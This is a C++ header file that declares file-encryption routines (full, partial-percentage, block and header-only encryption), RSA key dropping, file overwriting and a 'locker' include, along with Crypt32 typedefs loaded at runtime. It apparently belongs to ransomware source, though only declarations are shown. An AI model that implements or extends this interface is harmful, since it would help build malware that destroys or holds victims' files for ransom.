#ifndef _FILE_SYSTEM_H_
#define _FILE_SYSTEM_H_

#include "macro.h"
#include "structures.h"
#include "pathsystem.h"
#include "locker.h"

namespace filesystem
{
	BOOL getParseFile(PFILE_INFO FileInfo);
	BOOL CreateFileOpen(PFILE_INFO FileInfo);
	BOOL EncryptFileFullData(PFILE_INFO FileInfo);
	BOOL EncryptFilePartly(PFILE_INFO FileInfo, BYTE DataPercent);
	BOOL EncryptFileBlock(PFILE_INFO FileInfo);
	BOOL EncryptFileHeader(PFILE_INFO FileInfo);
	WCHAR* MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR* FPath);
	BOOL ReadFile_(PFILE_INFO FileInfo);
	BOOL DropRSAKey(WCHAR* Path, BYTE PublicKey[], BYTE PrivateKey[], DWORD SizeKey, DWORD p_SizeKey);
	BOOL EncryptRSA(WCHAR* KeyFile, WCHAR* Filename, WCHAR* newFileName);
	BOOL FileCryptEncrypt(CRYPT_INFO* CryptInfo, WCHAR* KeyFile, WCHAR* FileCrypt, WCHAR* newFilename);
	BOOL FileCryptDecrypt(CRYPT_INFO* CryptInfo, WCHAR* KeyFile,WCHAR* FileCrypt,WCHAR* newFilename);
	BOOL HashSignatureFile(SLIST<locker::HLIST>* list, WCHAR* FPath, WCHAR* Filename);
	VOID sort_hash_list(SLIST<HASH_LIST>* list);
	BOOL CreateSignatureFile(SLIST<HASH_LIST>* HashList, WCHAR* SignatureName, BYTE* SignatureRoot, DWORD sig_len);
	BOOL VerificationSignatureFile(SLIST<HASH_LIST>* HashList, WCHAR* SignatureName, BYTE* SignatureRoot, DWORD sig_len);
	VOID RootKeySignatureTrust(VOID);
	BOOL OverWriteFile(WCHAR* Path);
}


BOOL LoadCrypt32();
VOID UnLoadCrypt32();


typedef BOOL(WINAPI* CryptBinaryToStringA_t)
(
	const BYTE* pbBinary,
	DWORD cbBinary,
	DWORD dwFlags,
	LPSTR pszString,
	DWORD* pcchString
	);

typedef BOOL(WINAPI* CryptStringToBinaryA_t)
(
	LPCSTR pszString,
	DWORD cchString,
	DWORD dwFlags,
	BYTE* pbBinary,
	DWORD* pcbBinary,
	DWORD* pdwSkip,
	DWORD* pdwFlags
	);

typedef BOOL(WINAPI* CryptBinaryToStringW_t)
(
	const BYTE* pbBinary,
	DWORD       cbBinary,
	DWORD       dwFlags,
	LPWSTR      pszString,
	DWORD* pcchString
	);

typedef BOOL(WINAPI* CryptStringToBinaryW_t)
(
	LPCWSTR		pszString,
	DWORD		cchString,
	DWORD		dwFlags,
	BYTE* pbBinary,
	DWORD* pcbBinary,
	DWORD* pdwSkip,
	DWORD* pdwFlags
	);

enum
{
	BINARY_CRYPT = 5,
	BASE_CRYPT = 4,
	BINARY_CRYPT_W = 3,
	BASE_CRYPT_W = 2
};


#endif